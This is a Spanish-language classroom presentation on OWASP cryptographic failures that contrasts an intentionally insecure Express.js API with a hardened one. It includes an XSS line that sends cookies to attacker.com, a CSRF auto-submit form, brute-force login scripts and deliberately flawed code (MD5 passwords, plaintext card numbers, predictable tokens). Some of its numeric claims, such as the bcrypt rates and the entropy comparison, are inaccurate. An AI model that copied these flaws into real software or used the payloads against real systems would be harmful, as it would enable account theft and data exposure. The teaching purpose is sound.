# Exposición: Seguridad y Criptografía en el Proyecto OWASP
## A04:2025 - Cryptographic Failures

---

## Índice

1. [Introducción](#1-introducción)
2. [Algoritmos Criptográficos Utilizados](#2-algoritmos-criptográficos-utilizados)
3. [Análisis de Vulnerabilidades](#3-análisis-de-vulnerabilidades)
4. [Implementaciones Seguras](#4-implementaciones-seguras)
5. [Cómo Detectar Código Inseguro](#5-cómo-detectar-código-inseguro)
6. [Demostración Práctica](#6-demostración-práctica)
7. [Conclusiones y Recomendaciones](#7-conclusiones-y-recomendaciones)

---

## 1. Introducción

### 1.1 ¿Qué son los Cryptographic Failures?

Los **Cryptographic Failures** son vulnerabilidades que ocurren cuando:

- Se usa criptografía débil o inexistente para proteger datos sensibles
- Se implementan incorrectamente algoritmos criptográficos
- No se protegen adecuadamente datos en tránsito o en reposo
- Se exponen datos sensibles sin necesidad

**Impacto OWASP Top 10**: Posición #2 en 2021, ahora **A04 en 2025**

### 1.2 Arquitectura del Proyecto

Este proyecto implementa dos versiones de una API REST con Express.js:

```
├── vulnerable/     ❌ Versión INSEGURA (con fallos intencionales)
│   ├── config/     → Configuración de BD sin cifrado
│   ├── models/     → MD5 para contraseñas, datos en texto plano
│   ├── controllers/ → Sin validaciones robustas
│   └── routes/     → Sin rate limiting
│
└── secure/         ✓ Versión SEGURA (implementación correcta)
    ├── config/     → AES-256-GCM para datos sensibles
    ├── models/     → bcrypt, validaciones, auditoría
    ├── controllers/ → Validaciones, enmascaramiento de datos
    └── routes/     → Rate limiting, autenticación robusta
```

---

## 2. Algoritmos Criptográficos Utilizados

### 2.1 Versión VULNERABLE

#### MD5 (Message Digest Algorithm 5)

**Ubicación**: `vulnerable/models/User.js:7-10`

```javascript
static hashPassword(password) {
    console.log('⚠️  VULNERABILIDAD: Usando MD5 para contraseñas');
    return crypto.createHash('md5').update(password).digest('hex');
}
```

**Características**:
- Produce hash de 128 bits (32 caracteres hexadecimales)
- Algoritmo diseñado en 1991
- Tiempo de cálculo: ~0.000001 segundos

**¿Por qué es INSEGURO?**

1. **Sin Salt**: Misma contraseña = mismo hash
   ```
   password123 → 482c811da5d5b4bc6d497ffa98491e38
   password123 → 482c811da5d5b4bc6d497ffa98491e38  (¡Idéntico!)
   ```

2. **Rainbow Tables**: Bases de datos precomputadas
   - Millones de hashes MD5 ya calculados
   - Búsqueda en milisegundos

3. **Velocidad excesiva**: Permite ataques de fuerza bruta
   - GPU moderna: ~200 billones de hashes MD5/segundo
   - Todas las combinaciones de 8 caracteres: ~2 horas

4. **Colisiones conocidas**: Diferentes inputs producen mismo hash

**Ejemplo de ataque**:
```bash
# Hash MD5 de "password"
echo -n "password" | md5sum
# Output: 5f4dcc3b5aa765d61d8327deb882cf99

# Búsqueda en Google: "5f4dcc3b5aa765d61d8327deb882cf99 md5"
# Resultado instantáneo: "password"
```

---

### 2.2 Versión SEGURA

#### bcrypt (Blowfish Crypt)

**Ubicación**: `secure/models/User.js:9-12`

```javascript
static async hashPassword(password) {
    const saltRounds = 12;  // Factor de costo
    return await bcrypt.hash(password, saltRounds);
}
```

**Características**:
- Basado en el cifrado Blowfish
- Salt único automático
- Factor de costo ajustable
- Diseñado específicamente para contraseñas

**¿Por qué es SEGURO?**

1. **Salt único por hash**:
   ```
   password123 → $2b$12$K1lC8h3TzKPu.vQFQH7VUOz5QN6xW...
   password123 → $2b$12$A9xT2pL5mRvQwEsH1cD8fO3jN4kR...  (¡Diferente!)
   ```

2. **Factor de costo adaptativo** (salt rounds = 12):
   - 2^12 = 4,096 iteraciones
   - ~250-300ms por hash
   - Puede aumentarse con el tiempo

3. **Resistente a fuerza bruta**:
   - GPU moderna: ~100 hashes/segundo
   - Probar 1 millón de contraseñas: ~115 días

4. **Formato del hash**:
   ```
   $2b$12$K1lC8h3TzKPu.vQFQH7VUOz5QN6xW8pL9mN2oP3qR4sT5uV6wX7yZ
   │  │  │                     │
   │  │  │                     └─ Hash (31 chars)
   │  │  └─────────────────────── Salt (22 chars)
   │  └────────────────────────── Cost factor (12)
   └───────────────────────────── Algoritmo (2b)
   ```

**Comparación de velocidad**:

| Algoritmo | Hashes/segundo | Tiempo por hash |
|-----------|----------------|-----------------|
| MD5       | 200,000,000,000 | 0.000000005 s  |
| SHA-256   | 100,000,000,000 | 0.00000001 s   |
| bcrypt (12 rounds) | 4 | 0.25 s        |

---

#### AES-256-GCM (Advanced Encryption Standard)

**Ubicación**: `secure/config/database.js:23-86`

```javascript
class EncryptionHelper {
    constructor() {
        this.algorithm = 'aes-256-gcm';  // Cifrado autenticado
        this.key = Buffer.from(process.env.ENCRYPTION_KEY, 'base64');
        // Clave de 32 bytes (256 bits)
    }

    encrypt(text) {
        const iv = crypto.randomBytes(12);  // IV aleatorio
        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);

        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');

        const authTag = cipher.getAuthTag();  // Tag de autenticación

        // Formato: iv:authTag:datoCifrado
        return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
    }
}
```

**Características de AES-256-GCM**:

1. **Cifrado Simétrico**: Misma clave para cifrar y descifrar
2. **256 bits de seguridad**: 2^256 posibles claves
3. **GCM (Galois/Counter Mode)**: Modo de operación autenticado
4. **IV (Initialization Vector)**: 12 bytes aleatorios por cifrado

**¿Por qué es SEGURO?**

1. **Longitud de clave**:
   - 256 bits = 32 bytes = 2^256 combinaciones posibles
   - Número de combinaciones: 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936
   - Tiempo estimado para romper: Mayor que la edad del universo

2. **IV aleatorio**: Cada cifrado es único
   ```
   SSN: "123-45-6789"
   Cifrado 1: a1b2c3d4e5f6:1a2b3c4d:9f8e7d6c5b4a3210...
   Cifrado 2: 9z8y7x6w5v4u:8z9y0x1w:7u6t5s4r3q2p1o0n...
   (¡Completamente diferentes!)
   ```

3. **Authentication Tag (AEAD)**:
   - Detecta manipulación de datos
   - Garantiza integridad y autenticidad
   - Si alguien modifica el dato cifrado, la desencriptación falla

4. **Estándar militar**:
   - Aprobado por NIST (National Institute of Standards and Technology)
   - Usado por gobiernos y fuerzas armadas

**Estructura de datos cifrados**:
```
Original:  "123-45-6789"
              ↓
Cifrado:   "a1b2c3d4e5f6:1a2b3c4d5e6f:9f8e7d6c5b4a3210fe9a7b8c"
            │            │            │
            │            │            └─ Datos cifrados
            │            └────────────── Auth Tag (16 bytes)
            └─────────────────────────── IV (12 bytes)
```

---

#### Generación de Tokens de Sesión

**❌ VULNERABLE** - `vulnerable/models/User.js:65-75`

```javascript
static createSession(userId, callback) {
    // Token basado en timestamp con MD5
    const sessionToken = crypto.createHash('md5')
        .update(userId.toString() + Date.now().toString())
        .digest('hex');
    // Resultado: 5d41402abc4b2a76b9719d911017c592
}
```

**Problemas**:
1. **Predecible**: Basado en timestamp
2. **MD5 débil**: Vulnerable a colisiones
3. **Sin expiración**: Tokens válidos indefinidamente
4. **Reversible**: Posible adivinar el patrón

**✓ SEGURO** - `secure/models/User.js:167-189`

```javascript
static createSession(userId, ipAddress, userAgent, callback) {
    // Token de 32 bytes (256 bits) completamente aleatorio
    const sessionToken = crypto.randomBytes(32).toString('hex');
    // Resultado: 3f4a9c7b2e1d8f5a6c9b0e3d7a4f1c8e2b5d8a1f4c7e0b3d6a9f2c5e8b1d4a7f

    // Expiración: 24 horas
    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
}
```

**Seguridad**:
1. **crypto.randomBytes(32)**: Generador criptográficamente seguro (CSPRNG)
2. **256 bits de entropía**: Imposible de adivinar
3. **Expiración automática**: 24 horas
4. **Auditoría**: Se registra IP y User-Agent

**Entropía comparada**:
```
Vulnerable:  MD5(userId + timestamp)
            ≈ 30 bits de entropía (timestamp cambia cada segundo)

Segura:     randomBytes(32)
            = 256 bits de entropía
            = 8.5 veces más seguro
```

---

## 3. Análisis de Vulnerabilidades

### 3.1 Almacenamiento de Datos Sensibles en Texto Plano

**Ubicación vulnerable**: `vulnerable/models/User.js:13-31`

```javascript
static create(userData, callback) {
    const { username, password, email, ssn, credit_card, medical_info } = userData;

    const hashedPassword = this.hashPassword(password);  // Solo la contraseña (mal)

    const query = `
        INSERT INTO users (username, password, email, ssn, credit_card, medical_info)
        VALUES (?, ?, ?, ?, ?, ?)
    `;

    // ❌ SSN, tarjeta de crédito e info médica en TEXTO PLANO
    db.run(query, [username, hashedPassword, email, ssn, credit_card, medical_info]);
}
```

**Visualización en Base de Datos**:

```sql
-- Tabla: vulnerable.db → users
id | username | password                         | ssn         | credit_card      | medical_info
1  | john     | 5f4dcc3b5aa765d61d8327deb882cf99 | 123-45-6789 | 4532123456789010 | Diabetes tipo 2
```

**¿Qué puede salir mal?**

1. **SQL Injection**: Extracción de toda la tabla
2. **Acceso físico al servidor**: Archivo .db completamente legible
3. **Backup comprometido**: Datos sensibles expuestos
4. **Insider threat**: Administrador malicioso
5. **Cumplimiento legal**: Violación de GDPR, HIPAA, PCI-DSS

**Leyes violadas**:
- **PCI-DSS**: Prohibe almacenar números de tarjeta sin cifrado
- **HIPAA**: Requiere cifrado de información médica
- **GDPR**: Requiere protección de datos personales

---

### 3.2 Cookies sin Flags de Seguridad

**❌ VULNERABLE** - `vulnerable/controllers/authController.js`

```javascript
res.cookie('session_token', sessionToken);
// Sin configuración adicional
```

**Headers HTTP generados**:
```http
Set-Cookie: session_token=abc123; Path=/
```

**Vulnerabilidades**:

1. **Sin HttpOnly**: Accesible desde JavaScript
   ```javascript
   // Un atacante puede robar la cookie con XSS:
   <script>
   fetch('http://attacker.com?cookie=' + document.cookie);
   </script>
   ```

2. **Sin Secure**: Se envía por HTTP (sin cifrar)
   - Ataque Man-in-the-Middle (MITM)
   - Redes WiFi públicas

3. **Sin SameSite**: Vulnerable a CSRF (Cross-Site Request Forgery)
   ```html
   <!-- Sitio malicioso evil.com -->
   <form action="http://vulnerable-app.com/transfer" method="POST">
     <input name="amount" value="1000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit();</script>
   ```

4. **Sin MaxAge**: Cookie nunca expira

**✓ SEGURO** - `secure/controllers/authController.js:129-134`

```javascript
res.cookie('session_token', sessionToken, {
    httpOnly: true,      // ✓ Bloquea acceso desde JavaScript
    secure: process.env.NODE_ENV === 'production',  // ✓ Solo HTTPS
    sameSite: 'strict',  // ✓ Previene CSRF
    maxAge: 24 * 60 * 60 * 1000  // ✓ Expira en 24 horas
});
```

**Headers HTTP generados**:
```http
Set-Cookie: session_token=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400
```

**Protección otorgada**:
| Flag | Protege contra | Cómo funciona |
|------|----------------|---------------|
| HttpOnly | XSS (Cross-Site Scripting) | Cookie no accesible desde document.cookie |
| Secure | MITM (Man-in-the-Middle) | Solo se envía por HTTPS |
| SameSite=Strict | CSRF (Cross-Site Request Forgery) | Cookie no se envía en requests cross-origin |
| MaxAge | Sesión perpetua | Cookie se elimina automáticamente |

---

### 3.3 Sin Validación de Contraseñas

**❌ VULNERABLE** - `vulnerable/controllers/authController.js`

```javascript
static register(req, res) {
    const { username, password, email } = req.body;

    // Sin validación de contraseña
    if (!username || !password || !email) {
        return res.status(400).json({ message: 'Faltan campos' });
    }

    // Acepta CUALQUIER contraseña:
    // "123", "password", "abc", "11111111"
    User.create({ username, password, email }, callback);
}
```

**Contraseñas aceptadas**:
- ✗ `123`
- ✗ `password`
- ✗ `aaaaaaa`
- ✗ `qwerty`

**✓ SEGURO** - `secure/models/User.js:15-38`

```javascript
static validatePassword(password) {
    const errors = [];

    if (password.length < 12) {
        errors.push('Contraseña debe tener al menos 12 caracteres');
    }
    if (!/[A-Z]/.test(password)) {
        errors.push('Debe contener al menos una mayúscula');
    }
    if (!/[a-z]/.test(password)) {
        errors.push('Debe contener al menos una minúscula');
    }
    if (!/[0-9]/.test(password)) {
        errors.push('Debe contener al menos un número');
    }
    if (!/[!@#$%^&*]/.test(password)) {
        errors.push('Debe contener un carácter especial (!@#$%^&*)');
    }

    return { valid: errors.length === 0, errors };
}
```

**Contraseñas válidas**:
- ✓ `MySecureP@ssw0rd2024!`
- ✓ `Tr0ub4dor&3Extended`
- ✓ `C0mpl3x!P@ssword`

**Cálculo de entropía**:

```
Contraseña débil: "password"
- Solo minúsculas: 26 caracteres posibles
- 8 caracteres de longitud
- Combinaciones: 26^8 = 208,827,064,576
- Tiempo con bcrypt (4 hash/seg): ~1.6 años

Contraseña fuerte: "MyP@ssw0rd2024!"
- Mayúsculas + minúsculas + números + especiales: 94 caracteres
- 15 caracteres de longitud
- Combinaciones: 94^15 ≈ 5.5 × 10^29
- Tiempo con bcrypt: Mayor que edad del universo
```

---

### 3.4 Sin Rate Limiting

**❌ VULNERABLE** - `vulnerable/routes/authRoutes.js`

```javascript
router.post('/login', AuthController.login);
// Sin protección contra fuerza bruta
```

**Ataque de fuerza bruta posible**:

```python
import requests

# Lista de contraseñas comunes
passwords = ["123456", "password", "12345678", "qwerty", ...]

url = "http://localhost:3000/api/auth/login"

for password in passwords:
    response = requests.post(url, json={
        "username": "admin",
        "password": password
    })

    if response.json().get("success"):
        print(f"¡Contraseña encontrada!: {password}")
        break

# Sin límite de intentos → Puede probar millones
```

**✓ SEGURO** - `secure/routes/authRoutes.js`

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // Ventana de 15 minutos
    max: 5,  // Máximo 5 intentos por ventana
    message: {
        success: false,
        message: 'Demasiados intentos. Intente más tarde.'
    },
    standardHeaders: true,  // Headers RateLimit-*
    legacyHeaders: false
});

router.post('/login', loginLimiter, AuthController.login);
```

**Protección adicional** - Bloqueo de cuenta en `secure/models/User.js:226-241`

```javascript
static recordFailedLogin(userId, callback) {
    const query = `
        UPDATE users
        SET failed_login_attempts = failed_login_attempts + 1,
            account_locked_until = CASE
                WHEN failed_login_attempts + 1 >= 5
                THEN datetime('now', '+15 minutes')  -- Bloquea cuenta
                ELSE account_locked_until
            END
        WHERE id = ?
    `;

    db.run(query, [userId], callback);
}
```

**Comparación**:

| Escenario | Sin Rate Limiting | Con Rate Limiting + Bloqueo |
|-----------|-------------------|------------------------------|
| Intentos por minuto | Ilimitado | 5 cada 15 min |
| Tiempo para 1000 intentos | ~1 minuto | ~50 horas |
| Tiempo para 1M intentos | ~16 horas | ~5,700 años |

---

### 3.5 Exposición de Datos en Respuestas API

**❌ VULNERABLE** - `vulnerable/controllers/authController.js`

```javascript
static getProfile(req, res) {
    User.verifySession(sessionToken, (err, user) => {
        res.json({
            success: true,
            user: {
                id: user.id,
                username: user.username,
                ssn: user.ssn,                    // ❌ SSN completo
                credit_card: user.credit_card,    // ❌ Tarjeta completa
                medical_info: user.medical_info   // ❌ Info médica
            }
        });
    });
}
```

**Respuesta JSON**:
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "john",
    "ssn": "123-45-6789",
    "credit_card": "4532-1234-5678-9010",
    "medical_info": "Diabetes tipo 2, hipertensión"
  }
}
```

**Problemas**:
1. Datos sensibles en tráfico de red
2. Posible logging en proxies/CDN
3. Violación de principio de "mínimo privilegio"
4. XSS puede capturar la respuesta

**✓ SEGURO** - `secure/controllers/authController.js:186-196`

```javascript
// Enmascarar datos sensibles
const maskedData = {
    id: userData.id,
    username: userData.username,
    email: userData.email,
    ssn: userData.ssn ? '***-**-' + userData.ssn.slice(-4) : null,
    credit_card: userData.credit_card ? '**** **** **** ' + userData.credit_card.slice(-4) : null,
    medical_info: userData.medical_info ? '[Información médica disponible]' : null
};

res.json({ success: true, user: maskedData });
```

**Respuesta JSON enmascarada**:
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "john",
    "ssn": "***-**-6789",
    "credit_card": "**** **** **** 9010",
    "medical_info": "[Información médica disponible]"
  }
}
```

**Para acceso completo** - Requiere reautenticación:

```javascript
static getSensitiveData(req, res) {
    const { password } = req.body;

    // ✓ Verificar contraseña antes de mostrar datos completos
    const passwordMatch = await User.verifyPassword(password, user.password_hash);

    if (!passwordMatch) {
        User.logAudit(user.id, 'SENSITIVE_DATA_ACCESS_DENIED', req.ip);
        return res.status(401).json({ message: 'Contraseña incorrecta' });
    }

    // ✓ Log de auditoría
    User.logAudit(user.id, 'SENSITIVE_DATA_ACCESSED', req.ip);

    // Ahora sí retornar datos completos
    res.json({ sensitiveData: { ssn: full_ssn, ... } });
}
```

---

## 4. Implementaciones Seguras

### 4.1 Generación de Claves Criptográficas

**Script**: `scripts/generateKeys.js`

```javascript
const crypto = require('crypto');

// Generar SESSION_SECRET (64 bytes en hex = 512 bits)
const sessionSecret = crypto.randomBytes(64).toString('hex');
// Ejemplo: a1b2c3d4e5f6789abcdef0123456789...

// Generar ENCRYPTION_KEY (32 bytes en base64 = 256 bits)
const encryptionKey = crypto.randomBytes(32).toString('base64');
// Ejemplo: XyZ123AbC456DeF789GhI012JkL345MnO678PqR==
```

**Longitud de claves recomendadas**:

| Propósito | Algoritmo | Longitud mínima | Recomendada |
|-----------|-----------|-----------------|-------------|
| Sesiones | HMAC-SHA256 | 32 bytes | 64 bytes |
| Cifrado simétrico | AES | 16 bytes (AES-128) | 32 bytes (AES-256) |
| Contraseñas | bcrypt | - | 12+ salt rounds |
| Tokens | CSPRNG | 16 bytes | 32 bytes |

**Almacenamiento seguro**:

```env
# .env (NUNCA subir a Git)
SESSION_SECRET=a1b2c3d4e5f6789abcdef0123456789...
ENCRYPTION_KEY=XyZ123AbC456DeF789GhI012JkL345MnO678PqR==
```

```javascript
// Cargar variables de entorno
require('dotenv').config();

// Validar que existan
if (!process.env.ENCRYPTION_KEY) {
    throw new Error('ENCRYPTION_KEY no está configurada');
}
```

---

### 4.2 Auditoría y Logging Seguro

**Tabla de auditoría** - `secure/config/database.js:131-140`

```sql
CREATE TABLE audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    action TEXT NOT NULL,           -- Tipo de acción
    ip_address TEXT,                -- IP del cliente
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    details TEXT                    -- Información adicional
);
```

**Eventos auditados**:

```javascript
// En secure/models/User.js
static logAudit(userId, action, ipAddress, details) {
    const query = `
        INSERT INTO audit_log (user_id, action, ip_address, details)
        VALUES (?, ?, ?, ?)
    `;

    db.run(query, [userId, action, ipAddress, details]);
}

// Eventos:
- USER_CREATED          → Usuario registrado
- SESSION_CREATED       → Login exitoso
- LOGIN_FAILED          → Intento fallido
- LOGIN_BLOCKED         → Cuenta bloqueada
- PROFILE_VIEWED        → Perfil consultado
- SENSITIVE_DATA_ACCESSED → Datos sensibles accedidos
- SENSITIVE_DATA_ACCESS_DENIED → Acceso denegado
```

**Logging seguro** - NO registrar datos sensibles:

```javascript
// ❌ MAL - Versión vulnerable
console.log('Body:', req.body);
// Output: Body: { username: 'admin', password: 'MyPassword123!', ssn: '123-45-6789' }

// ✓ BIEN - Versión segura
const timestamp = new Date().toISOString();
console.log(`[${timestamp}] ${req.method} ${req.path} - IP: ${req.ip}`);
// Output: [2024-11-13T10:30:45.123Z] POST /api/auth/login - IP: 127.0.0.1
```

**Visualización de logs de auditoría**:

```sql
SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 10;

id | user_id | action                    | ip_address  | timestamp           | details
1  | 5       | SENSITIVE_DATA_ACCESSED   | 192.168.1.1 | 2024-11-13 10:30:45 | Usuario accedió...
2  | 5       | PROFILE_VIEWED            | 192.168.1.1 | 2024-11-13 10:28:12 | Usuario consultó...
3  | 3       | LOGIN_FAILED              | 192.168.1.5 | 2024-11-13 10:25:33 | Contraseña incorrecta
4  | 3       | LOGIN_FAILED              | 192.168.1.5 | 2024-11-13 10:25:15 | Contraseña incorrecta
```

---

### 4.3 Headers de Seguridad con Helmet

**Instalación**: `npm install helmet`

**Configuración** - `secure/server.js`

```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"]
        }
    },
    hsts: {
        maxAge: 31536000,           // 1 año
        includeSubDomains: true,
        preload: true
    }
}));

app.disable('x-powered-by');  // No revelar tecnología
```

**Headers de seguridad generados**:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
```

**Propósito de cada header**:

| Header | Protege contra | Funcionamiento |
|--------|----------------|----------------|
| Strict-Transport-Security (HSTS) | MITM, downgrade attacks | Fuerza uso de HTTPS |
| X-Content-Type-Options | MIME sniffing attacks | Browser respeta Content-Type |
| X-Frame-Options | Clickjacking | Previene iframes |
| Content-Security-Policy (CSP) | XSS | Controla recursos permitidos |
| X-XSS-Protection | XSS reflejado | Activa filtro XSS del browser |

---

## 5. Cómo Detectar Código Inseguro

### 5.1 Checklist de Seguridad Criptográfica

#### Contraseñas

- [ ] ¿Se usa bcrypt, Argon2 o scrypt?
- [ ] ¿Factor de costo suficiente? (bcrypt: ≥12 rounds)
- [ ] ¿Se valida complejidad de contraseña?
- [ ] ¿Se evita MD5, SHA-1, SHA-256 simple?

**Red flags**:
```javascript
// ❌ INSEGURO
crypto.createHash('md5').update(password)
crypto.createHash('sha1').update(password)
crypto.createHash('sha256').update(password)

// ✓ SEGURO
bcrypt.hash(password, 12)
argon2.hash(password)
```

#### Datos Sensibles

- [ ] ¿Datos sensibles cifrados en BD?
- [ ] ¿Se usa cifrado autenticado? (GCM, CCM)
- [ ] ¿IV aleatorio por cifrado?
- [ ] ¿Clave de 256 bits?
- [ ] ¿Datos enmascarados en APIs?

**Red flags**:
```javascript
// ❌ INSEGURO - Datos en texto plano
INSERT INTO users (ssn) VALUES ('123-45-6789')

// ❌ INSEGURO - Cifrado sin autenticación
crypto.createCipheriv('aes-256-cbc', key, iv)

// ✓ SEGURO
crypto.createCipheriv('aes-256-gcm', key, iv)
```

#### Tokens y Sesiones

- [ ] ¿Tokens aleatorios criptográficamente? (crypto.randomBytes)
- [ ] ¿Longitud suficiente? (≥16 bytes)
- [ ] ¿Tokens expiran?
- [ ] ¿Se registra IP y User-Agent?

**Red flags**:
```javascript
// ❌ INSEGURO
const token = Math.random().toString(36)
const token = Date.now().toString()
const token = crypto.createHash('md5').update(userId + timestamp)

// ✓ SEGURO
const token = crypto.randomBytes(32).toString('hex')
```

#### Cookies

- [ ] ¿Flag HttpOnly activado?
- [ ] ¿Flag Secure activado? (producción)
- [ ] ¿SameSite configurado?
- [ ] ¿MaxAge definido?

**Red flags**:
```javascript
// ❌ INSEGURO
res.cookie('session', token)

// ✓ SEGURO
res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 86400000
})
```

#### Rate Limiting

- [ ] ¿Endpoints de autenticación protegidos?
- [ ] ¿Límite razonable? (5-10 intentos/15min)
- [ ] ¿Bloqueo de cuenta tras intentos fallidos?

**Red flags**:
```javascript
// ❌ INSEGURO - Sin protección
router.post('/login', controller.login)

// ✓ SEGURO
router.post('/login', rateLimiter, controller.login)
```

---

### 5.2 Herramientas de Análisis

#### Análisis Estático

**npm audit**:
```bash
npm audit
# Escanea vulnerabilidades en dependencias
```

**Snyk**:
```bash
npm install -g snyk
snyk test
# Detecta vulnerabilidades y sugiere fixes
```

#### Análisis de Código

**ESLint con plugin de seguridad**:
```bash
npm install eslint-plugin-security --save-dev
```

```json
// .eslintrc.json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"]
}
```

**Detecta**:
- Uso de `eval()`
- RegEx vulnerables a ReDoS
- Generación débil de aleatorios
- Comparaciones no seguras

---

### 5.3 Testing de Seguridad

**Prueba de hashes MD5**:
```bash
# Generar hash
echo -n "password123" | md5sum
# Output: 482c811da5d5b4bc6d497ffa98491e38

# Buscar en rainbow table online
curl "https://md5decrypt.net/Api/api.php?hash=482c811da5d5b4bc6d497ffa98491e38"
# Output: password123
```

**Prueba de fuerza bruta**:
```python
import requests
import time

url = "http://localhost:3000/api/auth/login"
start = time.time()
attempts = 0

for i in range(100):
    r = requests.post(url, json={"username": "test", "password": f"pass{i}"})
    attempts += 1

    if r.status_code == 429:  # Rate limited
        print(f"✓ Rate limiting activo tras {attempts} intentos")
        break

elapsed = time.time() - start
print(f"Tiempo: {elapsed}s, Velocidad: {attempts/elapsed} req/s")
```

**Prueba de cifrado**:
```javascript
const text = "123-45-6789";
const encrypted1 = encrypt(text);
const encrypted2 = encrypt(text);

// ✓ CORRECTO: Deben ser diferentes (IV aleatorio)
console.assert(encrypted1 !== encrypted2, "IV no es aleatorio");

// ✓ CORRECTO: Descifrado debe dar texto original
console.assert(decrypt(encrypted1) === text, "Descifrado fallido");
```

---

## 6. Demostración Práctica

### 6.1 Configuración Inicial

```bash
# 1. Instalar dependencias
cd "C:\Users\kevin\Documents\Github\Seguridad de la Informacion\Owasp"
npm install

# 2. Generar claves criptográficas
node scripts/generateKeys.js

# 3. Configurar .env
copy .env.example .env
# Pegar las claves generadas en .env

# 4. Inicializar base de datos (opcional)
node scripts/initDatabase.js
```

---

### 6.2 Demostración de Vulnerabilidades

#### Demo 1: MD5 es débil

```bash
# Iniciar servidor vulnerable
npm run start:vulnerable

# En otra terminal, registrar usuario con contraseña débil
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"password","email":"demo@test.com"}'

# Verificar hash en la BD
sqlite3 vulnerable/database/vulnerable.db "SELECT username, password FROM users WHERE username='demo'"
# Output: demo|5f4dcc3b5aa765d61d8327deb882cf99

# Descifrar hash en 1 segundo
# Buscar en Google: "5f4dcc3b5aa765d61d8327deb882cf99 md5"
# Resultado: "password"
```

#### Demo 2: Datos en texto plano

```bash
# Registrar con datos sensibles
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"victim",
    "password":"weak123",
    "email":"victim@test.com",
    "ssn":"123-45-6789",
    "credit_card":"4532-1234-5678-9010"
  }'

# Ver datos expuestos
sqlite3 vulnerable/database/vulnerable.db \
  "SELECT username, ssn, credit_card FROM users WHERE username='victim'"
# Output: victim|123-45-6789|4532-1234-5678-9010
# ¡DATOS COMPLETAMENTE VISIBLES!
```

#### Demo 3: Fuerza bruta sin límite

```bash
# Script de ataque
for i in {1..100}; do
  curl -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"demo\",\"password\":\"attempt$i\"}" \
    -w "\nStatus: %{http_code}\n"
done

# Sin rate limiting: Todos los requests pasan
# ¡100 intentos en ~5 segundos!
```

---

### 6.3 Demostración de Protecciones

#### Demo 1: bcrypt es seguro

```bash
# Iniciar servidor seguro
npm run start:secure

# Registrar usuario con contraseña fuerte
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"secure_user",
    "password":"MySecureP@ssw0rd2024!",
    "email":"secure@test.com"
  }'

# Verificar hash en BD
sqlite3 secure/database/secure.db \
  "SELECT username, password_hash FROM users WHERE username='secure_user'"
# Output: secure_user|$2b$12$K1lC8h3TzKPu.vQFQH7VUOz5QN6xW8pL9mN...

# Intentar descifrar: IMPOSIBLE
# No hay rainbow tables para bcrypt
# Cada hash tiene salt único
```

#### Demo 2: Datos cifrados

```bash
# Registrar con datos sensibles
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"protected",
    "password":"MySecureP@ssw0rd2024!",
    "email":"protected@test.com",
    "ssn":"987-65-4321",
    "credit_card":"4532-9876-5432-1098"
  }'

# Ver datos cifrados en BD
sqlite3 secure/database/secure.db \
  "SELECT username, ssn_encrypted, credit_card_encrypted FROM users WHERE username='protected'"
# Output: protected|a1b2c3:1a2b3c:9f8e7d...|f4e5d6:4f5e6d:8c9b0a...
# ¡Completamente cifrados!
```

#### Demo 3: Rate limiting activo

```bash
# Intentar 10 logins rápidos
for i in {1..10}; do
  echo "Intento $i"
  curl -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"protected\",\"password\":\"wrong$i\"}" \
    -w "\nStatus: %{http_code}\n"
done

# Resultado:
# Intentos 1-5: Status 401 (Unauthorized)
# Intento 6+: Status 429 (Too Many Requests)
# Mensaje: "Demasiados intentos. Intente más tarde."
```

#### Demo 4: Datos enmascarados en API

```bash
# Login
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"protected","password":"MySecureP@ssw0rd2024!"}' \
  -c cookies.txt

# Ver perfil
curl http://localhost:3001/api/auth/profile -b cookies.txt

# Respuesta:
{
  "success": true,
  "user": {
    "username": "protected",
    "ssn": "***-**-4321",
    "credit_card": "**** **** **** 1098",
    "medical_info": "[Información médica disponible]"
  }
}
# ✓ Datos enmascarados
```

---

### 6.4 Scripts de Testing

**Ejecutar tests automatizados**:

```bash
# Test versión vulnerable
npm run test:vulnerable

# Salida esperada:
# ✗ VULNERABLE: Contraseña débil aceptada
# ✗ VULNERABLE: Token predecible
# ✗ VULNERABLE: Datos sensibles expuestos
# ✗ VULNERABLE: Sin rate limiting
```

```bash
# Test versión segura
npm run test:secure

# Salida esperada:
# ✓ PROTEGIDO: Contraseña débil rechazada
# ✓ PROTEGIDO: Token criptográficamente seguro
# ✓ PROTEGIDO: Datos enmascarados
# ✓ PROTEGIDO: Rate limiting activo
```

---

## 7. Conclusiones y Recomendaciones

### 7.1 Resumen de Conceptos Clave

#### Algoritmos INSEGUROS (NUNCA usar)

